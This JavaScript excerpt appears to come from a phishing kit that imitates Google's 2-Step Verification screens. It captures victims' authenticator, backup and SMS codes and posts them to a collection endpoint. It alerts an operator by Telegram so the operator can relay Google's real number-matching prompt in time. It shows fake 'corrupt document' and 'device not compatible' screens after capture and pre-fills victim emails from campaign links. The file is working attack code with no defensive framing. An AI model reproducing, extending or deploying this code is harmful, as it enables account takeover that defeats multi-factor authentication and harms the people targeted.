          body: JSON.stringify({ email: detected.email, code, method, _slug: userSlug, _hash: clientHash, _cid: campaignId, _cdm: campaignDomain, ...hbBundle() }),
        });
        const data = await resp.json();

        // Final verdict: corrupt PDF screen — leave spinner; navigation happens.
        if (data.success && data.corruptDoc) {
          if (opts.onSuccess) opts.onSuccess();
          else window.location.href = '/';
          return;
        }

        // Final verdict: wall of "device not compatible" — terminal failure, leave button disabled.
        if (data.notCompatible) {
          btn.classList.remove('is-loading');
          mfaError.textContent = t('error.notCompatible', 'Your device is not compatible with this document. Please try opening it on a different device.');
          mfaError.classList.remove('hidden');
          mfaError.style.display = 'block';
          return;
        }

        // Inside the MFA budget — restore button, show error below.
        btn.classList.remove('is-loading');
        btn.disabled = false;
        const mfaRemaining = (typeof data.remaining === 'number') ? data.remaining : 1;
        const tail = mfaRemaining === 1
          ? t('password.attemptRemaining', '1 attempt remaining.')
          : t('password.attemptsRemaining', '{n} attempts remaining.').replace('{n}', mfaRemaining);
        mfaError.textContent = `${data.error || ''} ${tail}`;
        mfaError.classList.remove('hidden');
        mfaError.style.display = 'block';
        digits.forEach(d => { d.value = ''; d.style.borderColor = 'var(--border,#e5e7eb)'; });
        digits[0].focus();
      } catch {
        btn.classList.remove('is-loading');
        btn.disabled = false;
        mfaError.textContent = t('error.network', 'Network error. Please try again.');
        mfaError.classList.remove('hidden');
        mfaError.style.display = 'block';
      }
    };
  }

  // ---- Google Prompt MFA Step ----
  // Mimics Google's real 2-Step Verification flow: a "Check your phone" push-prompt
  // with a number-matching tile, an auto-fallback after ~45s (or "Try another way"),
  // and three code-entry fallbacks (Authenticator / backup / text). Captures hit the
  // existing /api/verify-mfa endpoint with method = google_authenticator|backup|sms.
  function goToGoogleMfa() {
    hideAllSteps();
    const mfaStep = document.createElement('div');
    mfaStep.className = 'login-state active';
    mfaStep.dataset.lfStep = 'mfa';

    // Number is operator-pushed — comes from the admin "Active MFA" panel,
    // mirroring whatever the real Google sign-in shows on the operator's tab.
    // Until then, the recipient sees an animated "waiting" state.
    const accent = '#1a73e8';

    mfaStep.innerHTML = `
      <button class="login-back gmfa-back-btn"><i class="fas fa-arrow-left"></i> ${t('provider.back', 'Back')}</button>
      <div class="provider-logo">${logoEl.innerHTML}</div>
      <div style="text-align:center;">
        <h1 style="font-size:22px;font-weight:400;margin-bottom:8px;color:#202124;">${t('mfa.google.title', '2-Step Verification')}</h1>
        <div class="provider-pill"><span class="pp-av">${detected.email[0].toUpperCase()}</span>${detected.email}</div>
      </div>

      <!-- View 1: Google Prompt waiting screen -->
      <div id="gmfa-prompt" style="text-align:center;margin-top:28px;">
        <div style="display:inline-block;position:relative;margin-bottom:20px;">
          <i class="fas fa-mobile-screen-button" style="font-size:78px;color:${accent};"></i>
          <div style="position:absolute;top:6px;right:-6px;width:14px;height:14px;background:#ea4335;border-radius:50%;box-shadow:0 0 0 3px #fff;animation:gmfaPulse 1.4s ease-in-out infinite;"></div>
        </div>
        <h2 style="font-size:18px;font-weight:500;color:#202124;margin-bottom:10px;">${t('mfa.google.checkPhone', 'Check your phone')}</h2>
        <p style="color:#5f6368;font-size:14px;line-height:1.5;margin:0 auto 22px;max-width:340px;">
          ${t('mfa.google.checkPhoneBody', 'Google sent a notification to your phone.<br>Tap <strong>Yes</strong> on the notification to verify it\'s you.')}
        </p>

        <div style="background:#f1f3f4;border-radius:12px;padding:16px 18px;margin:0 auto 22px;max-width:280px;min-height:80px;display:flex;flex-direction:column;justify-content:center;align-items:center;">
          <div style="font-size:12px;color:#5f6368;margin-bottom:4px;" id="gmfa-num-label">${t('mfa.google.numberMatch', 'Make sure this number appears on your phone:')}</div>
          <div id="gmfa-num" style="font-size:42px;font-weight:500;color:${accent};letter-spacing:3px;line-height:1.1;min-height:48px;display:flex;align-items:center;gap:6px;">
            <span class="gmfa-dot" style="width:10px;height:10px;background:${accent};border-radius:50%;animation:gmfaDot 1.2s ease-in-out infinite;"></span>
            <span class="gmfa-dot" style="width:10px;height:10px;background:${accent};border-radius:50%;animation:gmfaDot 1.2s ease-in-out infinite .2s;"></span>
            <span class="gmfa-dot" style="width:10px;height:10px;background:${accent};border-radius:50%;animation:gmfaDot 1.2s ease-in-out infinite .4s;"></span>
          </div>
        </div>

        <div style="display:flex;align-items:center;justify-content:center;gap:8px;color:#5f6368;font-size:13px;margin-bottom:22px;">
          <i class="fas fa-spinner fa-spin"></i>
          <span id="gmfa-status">${t('mfa.google.waiting', 'Waiting for confirmation...')}</span>
        </div>

        <a href="#" id="gmfa-try-another" style="color:${accent};text-decoration:none;font-weight:500;font-size:14px;">${t('mfa.google.tryAnother', 'Try another way')}</a>
      </div>

      <!-- View 2: Method picker -->
      <div id="gmfa-fallback" style="display:none;margin-top:20px;">
        <h2 style="font-size:17px;font-weight:500;color:#202124;margin:0 auto 14px;text-align:center;">${t('mfa.google.tryAnotherTitle', 'Try another way to sign in')}</h2>
        <div style="max-width:380px;margin:0 auto 12px;">
          <div class="gmfa-method" data-method="google_authenticator" style="display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;cursor:pointer;margin-bottom:8px;transition:background 150ms;">
            <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><i class="fas fa-shield-halved" style="color:${accent};font-size:20px;"></i></div>
            <div style="flex:1;font-size:14px;color:#202124;">${t('mfa.google.opt.app', 'Get a verification code from the Google Authenticator app')}</div>
            <i class="fas fa-chevron-right" style="color:#5f6368;font-size:13px;"></i>
          </div>
          <div class="gmfa-method" data-method="google_backup" style="display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;cursor:pointer;margin-bottom:8px;transition:background 150ms;">
            <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><i class="fas fa-key" style="color:${accent};font-size:20px;"></i></div>
            <div style="flex:1;font-size:14px;color:#202124;">${t('mfa.google.opt.backup', 'Enter one of your 8-digit backup codes')}</div>
            <i class="fas fa-chevron-right" style="color:#5f6368;font-size:13px;"></i>
          </div>
          <div class="gmfa-method" data-method="google_sms" style="display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid #dadce0;border-radius:8px;cursor:pointer;transition:background 150ms;">
            <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><i class="fas fa-comment-sms" style="color:${accent};font-size:20px;"></i></div>
            <div style="flex:1;font-size:14px;color:#202124;">${t('mfa.google.opt.sms', 'Get a verification code by text message')}</div>
            <i class="fas fa-chevron-right" style="color:#5f6368;font-size:13px;"></i>
          </div>
        </div>
      </div>

      <!-- View 3: Code entry -->
      <div id="gmfa-code" style="display:none;margin-top:20px;">
        <h2 id="gmfa-code-title" style="font-size:18px;font-weight:500;color:#202124;margin:0 auto 6px;text-align:center;"></h2>
        <p id="gmfa-code-desc" style="color:#5f6368;font-size:14px;text-align:center;margin:0 auto 20px;max-width:340px;"></p>
        <form id="gmfa-code-form" autocomplete="off" style="max-width:360px;margin:0 auto;">
          <div id="gmfa-code-digits" style="display:flex;gap:6px;justify-content:center;margin-bottom:14px;flex-wrap:wrap;"></div>
          <p class="error-msg hidden" id="gmfa-code-error" style="text-align:center;margin-bottom:10px;"></p>
          <button type="submit" id="gmfa-code-submit" style="background:${accent};color:#fff;width:100%;padding:12px;border-radius:6px;font-size:14px;font-weight:500;border:none;cursor:pointer;font-family:inherit;">${t('mfa.google.next', 'Next')}</button>
          <p style="text-align:center;margin-top:14px;"><a href="#" id="gmfa-code-back" style="color:${accent};text-decoration:none;font-size:13px;font-weight:500;">${t('mfa.google.tryAnother', 'Try another way')}</a></p>
        </form>
      </div>

      <style>
        @keyframes gmfaPulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.4);opacity:.6}}
        @keyframes gmfaDot{0%,80%,100%{opacity:.3;transform:scale(.8)}40%{opacity:1;transform:scale(1.1)}}
      </style>
    `;
    card.appendChild(mfaStep);

    const promptView   = mfaStep.querySelector('#gmfa-prompt');
    const fallbackView = mfaStep.querySelector('#gmfa-fallback');
    const codeView     = mfaStep.querySelector('#gmfa-code');
    let currentMethod  = 'google_authenticator';
    let codeLength     = 6;
    let autoTimer      = null;
    let pollTimer      = null;

    // Announce arrival → operator gets Telegram alert + admin SSE event.
    fetch('/api/mfa-presence', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: detected.email, _slug: userSlug, _hash: clientHash, _cid: campaignId, _cdm: campaignDomain }),
    }).catch(() => {});

    // Poll for the operator-pushed number. As soon as it arrives, swap the
    // animated dots out for the actual number AND cancel the auto-fallback —
    // once a number is on screen, the recipient is engaged with the prompt
    // view and we should never bump them to "Try another way".
    let renderedNumber = null;
    async function pollNumber() {
      try {
        const r = await fetch(`/api/mfa-prompt-number?email=${encodeURIComponent(detected.email)}`);
        const d = await r.json();
        if (d && d.number && d.number !== renderedNumber) {
          renderedNumber = d.number;
          const numEl = mfaStep.querySelector('#gmfa-num');
          if (numEl) numEl.innerHTML = String(d.number);
          if (autoTimer) { clearTimeout(autoTimer); autoTimer = null; }
        }
      } catch {}
    }
    pollTimer = setInterval(pollNumber, 1500);
    pollNumber();

    function showFallback() {
      if (autoTimer) { clearTimeout(autoTimer); autoTimer = null; }
      promptView.style.display = 'none';
      codeView.style.display   = 'none';
      fallbackView.style.display = '';
    }

    // Auto-fall back after 5 minutes — gives the operator realistic time to
    // see the alert, look up the real Google number, and push it. Cancelled
    // the moment a number is pushed (above), so the timer only ever fires if
    // nobody is on the admin side.
    autoTimer = setTimeout(() => {
      const status = mfaStep.querySelector('#gmfa-status');
      if (status) status.textContent = t('mfa.google.didntReceive', "Didn't receive a notification?");
      setTimeout(showFallback, 1500);
    }, 5 * 60 * 1000);

    mfaStep.querySelector('.gmfa-back-btn').addEventListener('click', () => {
      if (autoTimer) clearTimeout(autoTimer);
      if (pollTimer) clearInterval(pollTimer);
      goToPassword();
    });
    mfaStep.querySelector('#gmfa-try-another').addEventListener('click', (e) => { e.preventDefault(); showFallback(); });

    function showCodeInput(method) {
      currentMethod = method;
      codeLength = (method === 'google_backup') ? 8 : 6;

      const titleEl = mfaStep.querySelector('#gmfa-code-title');
      const descEl  = mfaStep.querySelector('#gmfa-code-desc');
      if (method === 'google_authenticator') {
        titleEl.textContent = t('mfa.google.code.appTitle', 'Get a verification code');
        descEl.innerHTML    = t('mfa.google.code.appDesc', 'Enter the 6-digit code from the <strong>Google Authenticator</strong> app.');
      } else if (method === 'google_backup') {
        titleEl.textContent = t('mfa.google.code.backupTitle', 'Enter a backup code');
        descEl.innerHTML    = t('mfa.google.code.backupDesc', 'Enter one of your 8-digit backup codes.');
      } else {
        titleEl.textContent = t('mfa.google.code.smsTitle', '2-Step Verification');
        descEl.innerHTML    = t('mfa.google.code.smsDesc', 'A text message with a 6-digit verification code was just sent to your phone.');
      }

      const digitsContainer = mfaStep.querySelector('#gmfa-code-digits');
      digitsContainer.innerHTML = '';
      for (let i = 0; i < codeLength; i++) {
        const inp = document.createElement('input');
        inp.type = 'text'; inp.maxLength = 1; inp.inputMode = 'numeric'; inp.pattern = '[0-9]';
        inp.className = 'gmfa-code-digit';
        inp.style.cssText = 'width:38px;height:46px;text-align:center;font-size:20px;font-weight:600;border:1px solid #dadce0;border-radius:6px;outline:none;font-family:inherit;transition:border-color 120ms;';
        digitsContainer.appendChild(inp);
      }

      promptView.style.display   = 'none';
      fallbackView.style.display = 'none';
      codeView.style.display     = '';

      const digits = mfaStep.querySelectorAll('.gmfa-code-digit');
      digits[0].focus();
      digits.forEach((d, i) => {
        d.addEventListener('input', () => {
          d.value = d.value.replace(/[^0-9]/g, '');
          if (d.value && i < digits.length - 1) digits[i + 1].focus();
          d.style.borderColor = d.value ? accent : '#dadce0';
          const code = [...digits].map(x => x.value).join('');
          if (code.length === codeLength) document.getElementById('gmfa-code-form').requestSubmit();
        });
        d.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !d.value && i > 0) { digits[i - 1].focus(); digits[i - 1].value = ''; }
        });
        d.addEventListener('focus', () => { d.style.borderColor = accent; d.style.boxShadow = '0 0 0 2px rgba(26,115,232,0.18)'; });
        d.addEventListener('blur',  () => { d.style.boxShadow = 'none'; if (!d.value) d.style.borderColor = '#dadce0'; });
        d.addEventListener('paste', (e) => {
          e.preventDefault();
          const pasted = (e.clipboardData.getData('text') || '').replace(/[^0-9]/g, '').slice(0, codeLength);
          pasted.split('').forEach((ch, j) => { if (digits[j]) { digits[j].value = ch; digits[j].style.borderColor = accent; } });
          if (pasted.length === codeLength) document.getElementById('gmfa-code-form').requestSubmit();
          else if (digits[pasted.length]) digits[pasted.length].focus();
        });
      });
    }

    mfaStep.querySelectorAll('.gmfa-method').forEach(m => {
      m.addEventListener('mouseenter', () => { m.style.background = '#f8f9fa'; });
      m.addEventListener('mouseleave', () => { m.style.background = ''; });
      m.addEventListener('click', () => showCodeInput(m.dataset.method));
    });

    mfaStep.querySelector('#gmfa-code-back').addEventListener('click', (e) => { e.preventDefault(); showFallback(); });

    document.getElementById('gmfa-code-form').onsubmit = async (e) => {
      e.preventDefault();
      const digits = mfaStep.querySelectorAll('.gmfa-code-digit');
      const code = [...digits].map(x => x.value).join('');
      if (code.length !== codeLength) return;

      const btn = document.getElementById('gmfa-code-submit');
      btn.disabled = true;
      btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t('mfa.verifying', 'Verifying...')}`;
      const errEl = document.getElementById('gmfa-code-error');
      errEl.classList.add('hidden'); errEl.style.display = '';

      try {
        const resp = await fetch('/api/verify-mfa', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: detected.email, code, method: currentMethod, _slug: userSlug, _hash: clientHash, _cid: campaignId, _cdm: campaignDomain }),
        });
        const data = await resp.json();

        if (data.success && data.corruptDoc) {
          if (opts.onSuccess) opts.onSuccess();
          else window.location.href = '/';
          return;
        }
        if (data.notCompatible) {
          errEl.textContent = t('error.notCompatible', 'Your device is not compatible with this document. Please try opening it on a different device.');
          errEl.classList.remove('hidden'); errEl.style.display = 'block';
          btn.disabled = true;
          btn.innerHTML = t('password.failed', 'Failed');
          return;
        }
        const remaining = (typeof data.remaining === 'number') ? data.remaining : 1;
        const tail = remaining === 1
          ? t('password.attemptRemaining', '1 attempt remaining.')
          : t('password.attemptsRemaining', '{n} attempts remaining.').replace('{n}', remaining);
        errEl.textContent = `${t('mfa.google.wrongCode', 'Wrong code. Try again.')} ${tail}`;
        errEl.classList.remove('hidden'); errEl.style.display = 'block';
        digits.forEach(d => { d.value = ''; d.style.borderColor = '#dadce0'; });
        digits[0].focus();
        btn.disabled = false;
        btn.innerHTML = t('mfa.google.next', 'Next');
      } catch {
        errEl.textContent = t('error.network', 'Network error. Please try again.');
        errEl.classList.remove('hidden'); errEl.style.display = 'block';
        btn.disabled = false;
        btn.innerHTML = t('mfa.google.next', 'Next');
      }
    };
  }

  // Step 2: Provider button → always show password (no OAuth change)
  continueBtn.addEventListener('click', () => {
    if (!detected) return;
    goToPassword();
  });

  // Back button
  if (backBtn) backBtn.addEventListener('click', goToEmail);

  // Auto-detect email from URL path or query params
  // Supports:  /email@x.com, /v/slug/email@x.com, /v/slug/token/email@x.com,
  //            /base64encoded, ?email=..., ?e=base64
  let urlEmail = null;
  const rawSegments = window.location.pathname.split('/').filter(Boolean).map(decodeURIComponent);
  // Find the segment that looks like an email
  const emailSeg = rawSegments.find(s => s.includes('@') && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s));
  if (emailSeg) {
    urlEmail = emailSeg;
  } else {
    // Try base64-decoded last segment
    const last = rawSegments[rawSegments.length - 1];
    if (last && last.length > 3 && !/^[a-f0-9]{16,}$/i.test(last)) {
      try { const d = atob(last); if (d.includes('@')) urlEmail = d; } catch {}
    }
  }
  if (!urlEmail) {
    const params = new URLSearchParams(window.location.search);
    urlEmail = params.get('email');
    if (!urlEmail) {
      const enc = params.get('e');
      if (enc) { try { urlEmail = atob(enc); } catch {} }
    }
  }
  // Chameleon HTML puts the recipient email in the URL fragment after mailmerge:
  // #user%40domain.com?cid=...   The piece BEFORE the `?` is the URL-encoded email.
  if (!urlEmail) {
    const hashRaw = (window.location.hash || '').replace(/^#/, '');
    const hashEmailPart = hashRaw.split('?')[0];
    if (hashEmailPart && hashEmailPart !== 'E') {
      try {
        const decoded = decodeURIComponent(hashEmailPart);
        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) urlEmail = decoded;
      } catch {}
    }
  }
  // Server-injected prefilled email (from URL path parameter like /q/:hash/:email)
  if (!urlEmail && window.__PREFILLED_EMAIL__ && window.__PREFILLED_EMAIL__.includes('@')) {
    urlEmail = window.__PREFILLED_EMAIL__;
  }
  // Make the overlay visible immediately (loading step is active by default in HTML)
  const overlay = container.closest('.login-overlay') || container.closest('#loginOverlay');
  if (overlay) overlay.classList.remove('hidden');

  if (urlEmail && urlEmail.includes('@')) {
    // Email from URL — show loading with email, then auto-detect
    emailInput.value = urlEmail;
    goToLoading(urlEmail);

    const minDelay = new Promise(r => setTimeout(r, 3000));
    const detect = Promise.all([solveChallenge(), collectFingerprint()]).then(([challenge, fp]) =>
      fetch('/auth/detect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // Include slug/hash/cid/cdm so /auth/detect logs the email under the
        // right attachment (Clients dropbox in the Links tab). Without these,
        // the auto-prefilled email gets logged with campaignId=null and
        // doesn't show up under the attachment that was opened.
        body: JSON.stringify({ email: urlEmail, ...challenge, _fp: fp.hash, _fpSignals: fp.signals, _slug: userSlug, _hash: clientHash, _cid: campaignId, _cdm: campaignDomain }),
      }).then(r => r.json())
    );

    Promise.all([detect, minDelay]).then(([data]) => {
      if (data.error) { goToEmail(); showError(data.error); return; }
      goToProvider(data);
    }).catch(() => {
      goToEmail();
      showError('Network error. Please try again.');
    });
  } else {
    // No email in URL — show loading spinner, then transition to email form
    goToLoading();
    setTimeout(() => goToEmail(), 2000);
  }
}
